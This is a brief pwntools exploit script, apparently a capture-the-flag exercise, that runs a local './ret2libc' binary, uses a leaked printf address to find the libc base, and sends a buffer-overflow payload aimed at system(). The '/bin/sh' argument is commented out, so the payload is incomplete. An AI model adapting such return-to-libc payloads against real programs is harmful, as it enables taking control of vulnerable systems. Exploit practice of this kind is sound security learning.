from pwn import *

context.log_level = 'ERROR'

p = process('./ret2libc')
libc = ELF('./libc6_2.27-3ubuntu1_i386.so')

p.recvuntil(b': ')
printf = int(p.recvuntil(b'\n', drop=True), 16)
libc.address = printf - libc.symbols['printf']

print(hex(printf - 0x512d0 + 0x3d200))
print(hex(printf))
print(hex(libc.symbols['system']))

payload = b'A' * 0x14
payload += p32(libc.symbols['system'])  # system_plt
# payload += p32() # /bin/sh

p.sendline(payload)
p.interactive()
p.close()